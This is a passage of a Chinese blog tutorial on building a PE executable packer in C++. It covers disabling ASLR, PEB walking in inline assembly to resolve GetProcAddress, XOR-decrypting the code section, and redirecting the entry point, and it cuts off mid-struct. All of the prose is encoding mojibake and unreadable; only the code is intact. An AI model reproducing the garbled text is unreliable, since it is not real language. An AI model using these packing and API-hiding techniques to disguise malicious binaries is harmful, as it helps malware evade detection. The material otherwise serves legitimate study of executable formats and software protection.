‡æ–‡ä»¶åç§»å¤„æ’å…¥0x200å¤§å°çš„ç©ºé—´ã€‚<br>è¿™æ ·ä¸€æ¥ï¼Œå£³åŒºæ®µå°±åˆ›å»ºå¥½äº†ã€‚ ç„¶åæˆ‘ä»¬è¿˜è¦ä¿®æ”¹ æ‰©å±•å¤´çš„SizeofImage ã€‚å°†ä»–æ”¹ä¸ºæœ€åä¸€ä¸ªåŒºæ®µçš„å†…å­˜åœ°å€+å†…å­˜å¤§å°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145029.png" alt="QQæˆªå›¾20210217145029"></p><p>ç„¶åå»æ‰éšæœºåŸºå€é€‰é¡¹ã€‚</p><p>æ‰¾åˆ°æ‰©å±•å¤´çš„DLLå±æ€§å­—æ®µï¼Œå»æ‰éšæœºåŸºå€ï¼ŒæŠŠ40 81æ”¹ä¸º 00 81</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145042.png" alt="QQæˆªå›¾20210217145042"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠç¨‹åºå…¥å£ç‚¹è®¾ç½®ç»™å£³åŒºæ®µã€‚<br>ä½¿ç”¨LORDPEæŠŠå…¥å£ç‚¹è®¾ä¸ºå£³åŒºå—çš„è™šæ‹Ÿåœ°å€</p><p>ç„¶åæˆ‘ä»¬ç”¨ODæ‰“å¼€è¿™ä¸ªæ–‡ä»¶</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145116.png" alt="QQæˆªå›¾20210217145116"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145128.png" alt="QQæˆªå›¾20210217145128"></p><h3 id="çœŸæ­£çš„åŠ å£³æµç¨‹"><a href="#çœŸæ­£çš„åŠ å£³æµç¨‹" class="headerlink" title="çœŸæ­£çš„åŠ å£³æµç¨‹"></a>çœŸæ­£çš„åŠ å£³æµç¨‹</h3><p>åˆšåˆšæåˆ°çš„æ‰‹å·¥åŠ å£³ï¼Œä¸è¿‡æ˜¯æœ€æœ€åŸºç¡€çš„åŠ å£³åŸå‹è€Œå·²ï¼ŒçœŸæ­£çš„åŠ å£³è¿˜æ¶‰åŠäº†ä»£ç åŠ è§£å¯†ç­‰æ“ä½œ.</p><p>çœŸæ­£å†™å£³æ—¶ä¸€èˆ¬å†™ä¸¤ä¸ªä¸œè¥¿ï¼ŒåŠ å£³å™¨å’Œstub<br>æ‰€è°“åŠ å£³å™¨ï¼Œå°±æ˜¯ç»™è¢«åŠ å£³æ–‡ä»¶åˆ›é€ å‡ºä¸€ä¸ªæ–°çš„åŒºæ®µï¼Œ åœ¨æ­¤åŒæ—¶å°†ç¨‹åºä»¥æŸç§æ–¹å¼åŠ å¯†ï¼Œç„¶åæŠŠstubæ”¾å…¥æ–°åŒºæ®µï¼Œå¹¶å°†ç¨‹åºå…¥å£ç‚¹è®¾ä¸ºæ–°åŒºæ®µçš„åœ°å€ï¼Œç„¶ååœ¨æ–°åŒºæ®µç»“æŸåè·³è½¬å›åŸç¨‹åºå…¥å£ã€‚è¿™ä¸ªæ–°åŒºæ®µæˆ‘ä»¬å«åšå£³åŒºæ®µ.<br>é‚£ä¹ˆè¿™ä¸ªstubå°±æ˜¯åŠ å£³åç¨‹åºæœ€å…ˆæ‰§è¡Œçš„å‘½ä»¤äº†ï¼Œå®ƒæ‰§è¡Œè§£å¯†ç®—æ³•ï¼Œå°†åŸç¨‹åºé‡Šæ”¾å‡ºæ¥ã€‚</p><h2 id="åŸºäºc-çš„å£³ç¼–å†™"><a href="#åŸºäºc-çš„å£³ç¼–å†™" class="headerlink" title="åŸºäºc++çš„å£³ç¼–å†™"></a>åŸºäºc++çš„å£³ç¼–å†™</h2><p>å®ç°äº†ä¸€ä¸ªè–›å®šè°”çš„åŠ å£³å™¨ï¼ˆé›¾ï¼‰<br>åŠ å£³å¥½çš„ç¨‹åºæœ‰ä¸€å®šå‡ ç‡è¿è¡Œä¸äº†ï¼ŒåŸå› æœªçŸ¥ã€‚ã€‚</p><p><a href="https://github.com/ConsT27/PackingEXE/tree/master">https://github.com/ConsT27/PackingEXE/tree/master</a> ğŸ‘ˆé¡¹ç›®åœ°å€</p><p>å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šæ˜¯å€Ÿé‰´è¿™ä¸ªè€å“¥çš„<br><a href="https://github.com/TonyChen56/GuiShou_Pack">https://github.com/TonyChen56/GuiShou_Pack</a></p><p>ç¬¬ä¸€æ¬¡æ¥è§¦æ±‡ç¼–ç¼–ç¨‹ï¼Œc++ç¼–ç¨‹ï¼Œä¸Šæ¥å°±æ˜¯æè¿™ä¹ˆä¸€ä¸ªé¡¹ç›®ï¼Œæäº†å¿«ä¸¤ä¸ªæ˜ŸæœŸï¼Œç¡®å®æœ‰ç‚¹ç—›è‹¦ï¼Œåˆ°ç°åœ¨è¿˜æœ‰å¾ˆå¤§éƒ¨åˆ†ä¸æ˜¯å¾ˆæ‡‚çš„åœ°æ–¹ï¼ˆæ¯”å¦‚è®¸å¤šæ•°æ®ç±»å‹ä»¥åŠåº•å±‚æ±‡ç¼–ï¼ˆç¬‘ğŸ˜<br>è¿™ä¸ªé¡¹ç›®ä¹Ÿå­˜åœ¨bugï¼Œä¹Ÿå°±æ˜¯åˆšåˆšè¯´çš„ç¨‹åºæœ‰å‡ ç‡ä¸èƒ½è¿è¡Œçš„é—®é¢˜ã€‚ğŸ˜¡<br>ä½†æ˜¯ä¹Ÿå­¦åˆ°äº†æŒºå¤šï¼Œæ¯”å¦‚PEBåŠ¨æ€å¯»å€ï¼ŒPEæ–‡ä»¶ç»“æ„ç­‰ç­‰ã€‚ğŸ˜<br>è‹¦äºç½‘ä¸Šæ²¡æœ‰ä¸€ç¯‡æ–‡ç« è¯¦ç»†çš„äº¤ä»£äº†æŠ€æœ¯çš„ç»†èŠ‚ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« ä¼šå°½å¯èƒ½çš„è¯¦ç»†ã€‚<br>æ¥ä¸‹æ¥æ˜¯å„ä¸ªæµç¨‹çš„è¯¦ç»†å®ç°æ–¹æ³•ï¼Œè‡³äºæ€ä¹ˆæŠŠå„ä¸ªæµç¨‹é“¾æ¥èµ·æ¥ï¼Œå¸ˆå‚…ä»¬å¯ä»¥é€šè¿‡ä¸‹è½½ä¸Šé¢æåˆ°çš„ä¸¤ä¸ªé¡¹ç›®æ¥çœ‹ä¸€ä¸‹ã€‚</p><h3 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a>Stub</h3><p>stubæ˜¯è¢«æ¤å…¥åˆ°PEæ–‡ä»¶ä¸­çš„ä»£ç ï¼Œå®ƒä¸€èˆ¬ä¼šå¹²ä¸‹é¢è¿™äº›äº‹æƒ…ã€‚</p><p>æµç¨‹å¦‚ä¸‹</p><p>0.åˆå¹¶dataï¼Œrdataåˆ°text<br>1.PEBåŠ¨æ€å¯»å€ï¼Œéå†å¯¼å‡ºè¡¨æ‰¾åˆ°GetProcAddresså‡½æ•°<br>2.è§£å¯†<br>3.ä¿®æ”¹å…¥å£ç‚¹åˆ°åŸå…¥å£ç‚¹</p><p>åŒæ—¶stubä¸€èˆ¬ä»¥dllçš„å½¢å¼å­˜åœ¨ã€‚åŸå› æ˜¯DLLé€šå¸¸è‡ªå¸¦é‡å®šä½è¡¨ï¼Œè¿™åœ¨æˆ‘ä»¬çš„ç§»æ¤è¿‡ç¨‹ä¸­çš„é‡å®šä½æ“ä½œä¸­æä¾›äº†å·¨å¤§çš„ä¾¿åˆ©ã€‚</p><h4 id="åˆå¹¶æ•°æ®æ®µ"><a href="#åˆå¹¶æ•°æ®æ®µ" class="headerlink" title="åˆå¹¶æ•°æ®æ®µ"></a>åˆå¹¶æ•°æ®æ®µ</h4><p>æˆ‘ä»¬è¦ç§»æ¤stubè¿‡å»ï¼Œè‚¯å®šéœ€è¦ç§»æ¤ä»£ç æ®µï¼Œä¹Ÿéœ€è¦ç§»æ¤æ•°æ®æ®µã€‚ä¸å¦‚æˆ‘ä»¬å¹²è„†æŠŠæ•°æ®æ®µåˆå¹¶åˆ°ä»£ç æ®µï¼Œä¸€å—ç§»æ¤è¿‡å»ã€‚</p><h4 id="PEBåŠ¨æ€å¯»å€-amp-å¯¼å‡ºè¡¨éå†æ‰¾å‡½æ•°"><a href="#PEBåŠ¨æ€å¯»å€-amp-å¯¼å‡ºè¡¨éå†æ‰¾å‡½æ•°" class="headerlink" title="PEBåŠ¨æ€å¯»å€&amp;å¯¼å‡ºè¡¨éå†æ‰¾å‡½æ•°"></a>PEBåŠ¨æ€å¯»å€&amp;å¯¼å‡ºè¡¨éå†æ‰¾å‡½æ•°</h4><p>ä¸ºä»€ä¹ˆä¼šç”¨åˆ°è¿™ä¸ªæŠ€æœ¯ç¼–å†™stubï¼Ÿ<br>å› ä¸ºæˆ‘ä»¬çš„stub.dllæ¤å…¥åˆ°å®¿ä¸»ç¨‹åºæ—¶ï¼Œåªæœ‰.textæ¤å…¥è¿‡å»ï¼Œæ²¡æœ‰å¯¹åº”çš„å¯¼å…¥è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„stubæ— æ³•ç›´æ¥è°ƒç”¨ä¸€äº›APIã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ¨æ€è·å–å„ç§APIã€‚<br>å…¶ä¸­æˆ‘é‡‡ç”¨çš„æ˜¯PEBåŠ¨æ€æŸ¥è¯¢å¾—åˆ°GetProcAddresså‡½æ•°ï¼Œç„¶åç”¨GetProcAddresså‡½æ•°å»è·å–å„ä¸ªAPIã€‚</p><p>é‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯PEBï¼Ÿ<br>PEBæ˜¯ä¸€ä¸ªå¾®è½¯è¿˜æœªå®Œå…¨å…¬å¼€ä½œç”¨çš„ä¸€ä¸ªç»“æ„ï¼Œå®ƒå«åš è¿›ç¨‹ç¯å¢ƒä¿¡æ¯å— ï¼ŒåŒ…å«äº†è¿›ç¨‹çš„ä¿¡æ¯ã€‚å…¶ç»“æ„å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged; &#x2F;&#x2F;è¢«è°ƒè¯•çŠ¶æ€</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  BYTE                          Reserved4[104];</span><br><span class="line">  PVOID                         Reserved5[52];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved6[128];</span><br><span class="line">  PVOID                         Reserved7[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…³å¿ƒçš„æ˜¯PEBåç§»0cå¾—åˆ°çš„ PPEB_LDR_DATA Ldr; å®ƒæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ª PPEB_LDR_DATA ç»“æ„ï¼Œ å­˜æ”¾ç€å·²ç»è¢«è¿›ç¨‹è£…åœ¨çš„åŠ¨æ€é“¾æ¥åº“çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA</span><br><span class="line">&#123;</span><br><span class="line">ã€€ULONG Length; &#x2F;&#x2F; +0x00</span><br><span class="line">ã€€BOOLEAN Initialized; &#x2F;&#x2F; +0x04</span><br><span class="line">ã€€PVOID SsHandle; &#x2F;&#x2F; +0x08</span><br><span class="line">ã€€LIST_ENTRY InLoadOrderModuleList; &#x2F;&#x2F; +0x0c</span><br><span class="line">ã€€LIST_ENTRY InMemoryOrderModuleList; &#x2F;&#x2F; +0x14</span><br><span class="line">ã€€LIST_ENTRY InInitializationOrderModuleList;&#x2F;&#x2F; +0x1c</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; &#x2F;&#x2F; +0x24</span><br></pre></td></tr></table></figure><p>PPEB_LDR_DATA åç§»1cæ˜¯ä¸€ä¸ªæŒ‡å‘LIST_ENTRY InInitializationOrderModuleListç»“æ„çš„æŒ‡é’ˆï¼Œè¿™ä¸ªç»“æ„ å­˜æ”¾ç€æŒ‡å‘æ¨¡å—åˆå§‹åŒ–é“¾è¡¨çš„å¤´ ï¼Œ æŒ‰é¡ºåºå­˜æ”¾ç€PEè£…å…¥è¿è¡Œæ—¶åˆå§‹åŒ–æ¨¡å—ä¿¡æ¯ï¼Œä¸€èˆ¬æ¥è¯´ç¬¬ä¸€ä¸ªé“¾è¡¨ç»“ç‚¹æ˜¯ntdll.dll,ç¬¬äºŒä¸ªé“¾è¡¨ç»“ç‚¹å°±æ˜¯kernel32.dll ã€‚æˆ‘ä»¬å°±åœ¨å…¶ä¸­æ‰¾åˆ°kernel32.dllçš„ä¿¡æ¯ï¼Œè·å–å…¶PEä¿¡æ¯ï¼Œå¾—åˆ°å¯¼å‡ºè¡¨ï¼Œå¾ªç¯éå†å¾—åˆ°GetProcAddresså‡½æ•°ã€‚<br>å¦å¤–ï¼ŒPEBåœ°å€å†TEBåç§»0x30å¤„ã€‚ç”¨æ±‡ç¼–è¯­è¨€è¡¨ç¤ºå°±æ˜¯ fs:[0x30]ã€‚</p><p>ä»¥ä¸Šæ˜¯PEBå¯»å€çš„å¤§è‡´æµç¨‹ï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„ç‚¹æ˜¯éå†kernel32.dllå¯¼å‡ºè¡¨è·å¾—GetProcAddresså‡½æ•°ä¿¡æ¯ã€‚<br>å…³äºå¯¼å‡ºè¡¨å¯ä»¥çœ‹çœ‹è¿™ä¸ªæ–‡ç« <a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p><p>é¦–å…ˆä¸€ä¸ªå¯¼å‡ºè¡¨ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;  &#x2F;&#x2F;ä¸€èˆ¬ä¸º0ï¼Œæ²¡å•¥ç”¨</span><br><span class="line">    DWORD   TimeDateStamp;  &#x2F;&#x2F;å¯¼å‡ºè¡¨ç”Ÿæˆçš„æ—¶é—´</span><br><span class="line">    WORD    MajorVersion;  &#x2F;&#x2F;ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯0æ²¡å•¥ç”¨</span><br><span class="line">    WORD    MinorVersion;  &#x2F;&#x2F;ä¹Ÿæ˜¯æ²¡å•¥ç”¨çš„ç‰ˆæœ¬ä¿¡æ¯ä¸€èˆ¬ä¸º0</span><br><span class="line">    DWORD   Name;  &#x2F;&#x2F;å½“å‰å¯¼å‡ºè¡¨çš„æ¨¡å—åå­—</span><br><span class="line">    DWORD   Base;  &#x2F;&#x2F;åºå·è¡¨ä¸­åºå·çš„åŸºæ•°</span><br><span class="line">    DWORD   NumberOfFunctions;  &#x2F;&#x2F;å¯¼å‡ºå‡½æ•°æ•°é‡</span><br><span class="line">    DWORD   NumberOfNames;  &#x2F;&#x2F;æŒ‰åå­—å¯¼å‡ºå‡½æ•°çš„æ•°é‡</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; åºå·è¡¨</span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; åç§°è¡¨</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; åœ°å€è¡¨</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­åºå·è¡¨çš„èµ·å§‹åºå·æ˜¯Baseå±æ€§å®šä¹‰çš„å€¼ã€‚ä»¥ä¸‹æ˜¯å¯¼å‡ºè¡¨çš„åºå·åç§°åœ°å€è¡¨çš„å…³ç³»</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145159.png" alt="QQæˆªå›¾20210217145159"></p><p>æˆ‘ä»¬çš„éå†æµç¨‹æ˜¯ï¼Œå…ˆéå†åç§°è¡¨æ‰¾åˆ°GetProcAddressåœ¨åç§°æ•°ç»„ä¸­çš„ä¸‹æ ‡ï¼Œç„¶åæ ¹æ®è¿™ä¸ªä¸‹æ ‡å»åºå·æ•°ç»„ä¸­æ‰¾ç›¸åŒä¸‹æ ‡çš„åºå·å€¼ï¼Œç„¶åä»¥è¿™ä¸ªåºå·å€¼ä¸ºä¸‹æ ‡å»æ‰¾åœ°å€æ•°ç»„ä¸­çš„å¯¹åº”å€¼ã€‚æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€è¡¨ä¸­çš„å€¼å°±æ˜¯å‡½æ•°å…¥å£</p><p>ä¸‹é¢æˆ‘æŠŠè¿™æ®µç¨‹åºçš„æ±‡ç¼–ä»£ç æ”¾å‡ºæ¥ã€‚æˆ‘æ˜¯ç”¨å†…è”æ±‡ç¼–æŠŠè¿™æ®µä»£ç å¡è¿›C++çš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetApis()</span><br><span class="line">&#123;</span><br><span class="line">HMODULE hKernel32;</span><br><span class="line"></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">pushad;</span><br><span class="line">; &#x2F;&#x2F;è·å–kernel32.dllçš„åŠ è½½åŸºå€;</span><br><span class="line">mov eax, fs: [0x30] ;  &#x2F;&#x2F;å¾—åˆ°PEBåœ°å€</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;è·å¾—LDR_PEB_DATAåœ°å€</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;è·å¾—LIST_ENTRY InLoadOrderModuleList;åœ°å€</span><br><span class="line">mov eax, [eax];  &#x2F;&#x2F;è·å¾—LIST_ENTRY InLoadOrderModuleListä¸‹ä¸€é¡¹çš„åœ°å€</span><br><span class="line">mov eax, [eax];  &#x2F;è·å¾—LIST_ENTRY InLoadOrderModuleListä¸‹ä¸‹é¡¹å³æˆ‘ä»¬éœ€è¦çš„LIST_ENTRY InInitializationOrderModuleListçš„åœ°å€</span><br><span class="line">mov eax, [eax + 018h]; &#x2F;&#x2F;è·å¾—kernel32.dllåœ°å€</span><br><span class="line">mov hKernel32, eax;</span><br><span class="line">mov ebx, [eax + 03ch];&#x2F;&#x2F;è·å¾—kernel32.dll NTå¤´RVA</span><br><span class="line">add ebx, eax; &#x2F;&#x2F;NTå¤´çš„VA</span><br><span class="line">add ebx, 078h; &#x2F;&#x2F;è·å¾—åŒºæ®µè¡¨</span><br><span class="line">mov ebx, [ebx]; &#x2F;&#x2F;è·å¾—å¯¼å‡ºè¡¨RVA</span><br><span class="line">add ebx, eax;  &#x2F;&#x2F;å¯¼å‡ºè¡¨VA</span><br><span class="line">lea ecx, [ebx + 020h];  </span><br><span class="line">mov ecx, [ecx]; &#x2F;&#x2F; ecx &#x3D;&gt; åç§°è¡¨çš„é¦–åœ°å€(rva);</span><br><span class="line">add ecx, eax; &#x2F;&#x2F; ecx &#x3D;&gt; åç§°è¡¨çš„é¦–åœ°å€(va);</span><br><span class="line">xor edx, edx; &#x2F;&#x2F; ä½œä¸ºç´¢å¼•(index)æ¥ä½¿ç”¨.</span><br><span class="line">_WHILE:;</span><br><span class="line">mov esi, [ecx + edx * 4];&#x2F;&#x2F;åç§°æ•°ç»„å…¥å£ç‚¹rvaï¼Œåç§°æ•°ç»„å•ä½å¤§å°4å­—èŠ‚</span><br><span class="line">lea esi, [esi + eax];  &#x2F;&#x2F;å…¥å£ç‚¹VA</span><br><span class="line">cmp dword ptr[esi], 050746547h;   &#x2F;&#x2F;è¿›è¡Œåç§°åŒ¹é…ï¼Œ050746547hå³å°ç«¯å­˜å‚¨çš„GetP</span><br><span class="line">jne _LOOP;&#x2F;&#x2F;ä¸ç›¸ç­‰å°±è·³å…¥_LOOPæ®µ</span><br><span class="line">cmp dword ptr[esi + 4], 041636f72h; &#x2F;&#x2F;åé™ˆåŒ¹é…ï¼ŒrocAï¼Œä»¥ä¸‹ä¾æ¬¡ä¸ºddreï¼Œss</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp dword ptr[esi + 8], 065726464h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp word  ptr[esi + 0ch], 07373h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">mov edi, [ebx + 024h]; </span><br><span class="line">add edi, eax;  &#x2F;&#x2F;è·å¾—åºå·è¡¨VA</span><br><span class="line"></span><br><span class="line">mov di, [edi + edx * 2];  &#x2F;&#x2F;è·å¾—åºå·æ•°ç»„ä¸­å¯¹åº”ä¸‹æ ‡çš„åœ°å€ï¼Œåºå·æ•°ç»„å•ä½å¤§å°2å­—èŠ‚</span><br><span class="line">and edi, 0FFFFh;  &#x2F;&#x2F;ç»™diæä½åˆ°32ä½ï¼Œå³ç»™äºˆedi åºå·è¡¨ä¸­å¯¹åº”ä¸‹æ ‡çš„åœ°å€</span><br><span class="line">mov edx, [ebx + 01ch];  </span><br><span class="line">add edx, eax;  &#x2F;&#x2F;è·å¾—åœ°å€è¡¨</span><br><span class="line">mov edi, [edx + edi * 4];  &#x2F;&#x2F;è·å¾—åœ°å€æ•°ç»„ä¸­ï¼Œåºå·å¯¹åº”çš„å€¼ï¼Œåœ°å€æ•°ç»„å•ä½å¤§å°4å­—èŠ‚</span><br><span class="line">add edi, eax;   &#x2F;&#x2F;è·å¾—GetProcAddressçš„å…¥å£åœ°å€</span><br><span class="line">mov MyGetProcAddress, edi;  &#x2F;&#x2F;èµ‹å€¼</span><br><span class="line">jmp _ENDWHILE;  &#x2F;&#x2F;END</span><br><span class="line">_LOOP:;</span><br><span class="line">inc edx; &#x2F;&#x2F; ++index;</span><br><span class="line">jmp _WHILE;</span><br><span class="line">_ENDWHILE:;</span><br><span class="line">popad;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h4><p>è§£å¯†ä»£ç æ®µã€‚è¿™æ®µå¥½å†™ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Decrypt()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char* pText &#x3D; (unsigned char*)g_conf.textScnRVA + 0x400000;&#x2F;&#x2F;é”å®šåˆ°PEæ–‡ä»¶çš„textæ®µï¼ˆå› ä¸ºåŠ å£³æ—¶å»æ‰äº†åŸºå€éšæœºåŒ–ï¼Œæ‰€ä»¥è‡ªä¿¡çš„æŠŠåŸºå€å¡«æˆ0x400000</span><br><span class="line"></span><br><span class="line">DWORD old &#x3D; 0;</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);&#x2F;&#x2F;ä¿®æ”¹ä»£ç æ®µçš„å±æ€§,æ³¨æ„æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†åŠ¨æ€è·å¾—çš„</span><br><span class="line">&#x2F;&#x2F;è§£å¯†ä»£ç æ®µ</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; g_conf.textScnSize; i++)</span><br><span class="line">&#123;</span><br><span class="line">pText[i] ^&#x3D; g_conf.key;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;æŠŠå±æ€§ä¿®æ”¹å›å»</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¿®æ”¹å…¥å£ç‚¹"><a href="#ä¿®æ”¹å…¥å£ç‚¹" class="headerlink" title="ä¿®æ”¹å…¥å£ç‚¹"></a>ä¿®æ”¹å…¥å£ç‚¹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, g_conf.srcOep;  &#x2F;&#x2F;å…¥å£ç‚¹æ˜¯g_conf.srcOep</span><br><span class="line">add eax, 0x400000</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŠ å£³å™¨"><a href="#åŠ å£³å™¨" class="headerlink" title="åŠ å£³å™¨"></a>åŠ å£³å™¨</h3><p>åŠ å£³å™¨æµç¨‹å¦‚ä¸‹</p><p>1.æ‰“å¼€éœ€è¦è¢«åŠ å£³çš„PEæ–‡ä»¶<br>2.åŠ è½½stub<br>3.åŠ å¯†ä»£ç æ®µ<br>4.æ·»åŠ æ–°åŒºæ®µ<br>5.stubé‡å®šä½ä¿®å¤<br>6.stubç§»æ¤<br>7.PEæ–‡ä»¶å…¥å£ç‚¹ä¿®æ”¹<br>8.å»éšæœºåŸºå€<br>9.ä¿å­˜æ–‡ä»¶</p><p>ä»¥ä¸‹çš„å„ä¸ªæµç¨‹æè¿°ä¸­ä¼šç”¨åˆ°è¯¸å¤šè‡ªå®šä¹‰å‡½æ•°ï¼Œæˆ‘å…ˆè´´ä¸Šæ¥å§ã€‚</p><h4 id="è¯¸å¤šè‡ªå®šå‡½æ•°-amp-ç»“æ„ä½“"><a href="#è¯¸å¤šè‡ªå®šå‡½æ•°-amp-ç»“æ„ä½“" class="headerlink" title="è¯¸å¤šè‡ªå®šå‡½æ•°&amp;ç»“æ„ä½“"></a>è¯¸å¤šè‡ªå®šå‡½æ•°&amp;ç»“æ„ä½“</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">&#x2F;&#x2F;å¯¹é½å¤„ç†</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;5</span><br><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">int AlignMent(_In_ int size, _In_ int alignment) &#123;</span><br><span class="line">return (size) % (alignment)&#x3D;&#x3D;0 ? (size) : ((size) &#x2F; alignment+1) * (alignment);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">&#x2F;&#x2F;PEä¿¡æ¯è·å–å‡½æ•°ç°‡</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;2</span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_DOS_HEADER(pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;FileHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) &#123;</span><br><span class="line">DWORD SecNum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER FirstSec &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">PIMAGE_SECTION_HEADER LastSec &#x3D; FirstSec + SecNum - 1;</span><br><span class="line">return LastSec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) &#123;</span><br><span class="line">DWORD Secnum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER Section &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">char buf[10] &#x3D; &#123; 0 &#125;;</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; Secnum; i++) &#123;</span><br><span class="line">memcpy_s(buf, 8, (char*)Section[i].Name, 8);</span><br><span class="line">if (!strcmp(buf, name)) &#123;</span><br><span class="line">return Section + i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;å…¥å£ç‚¹</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;ä»£ç æ®µRVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;ä»£ç æ®µçš„å¤§å°</span><br><span class="line">DWORD key;&#x2F;&#x2F;è§£å¯†å¯†é’¥</span><br><span class="line">&#125;StubConf;</span><br><span class="line"></span><br><span class="line">struct StubInfo</span><br><span class="line">&#123;</span><br><span class="line">char* dllbase;&#x2F;&#x2F;stub.dllçš„åŠ 